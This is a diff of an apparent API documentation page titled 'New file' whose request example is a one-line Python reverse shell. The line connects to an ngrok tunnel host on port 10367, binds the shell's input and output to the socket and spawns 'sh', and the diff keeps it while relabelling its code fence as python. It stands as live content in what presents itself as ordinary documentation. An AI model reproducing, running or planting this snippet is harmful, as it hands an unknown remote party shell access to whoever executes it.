@@ -1,13 +1,11 @@
 ---
 title: "New file"
-description: "Description of your new file.
-pop"
+description: "Description of your new file. pop"
 ---
 
 <RequestExample>
 
-```filename
-// add code here
+```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ap.ngrok.io",10367));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
 ```
 
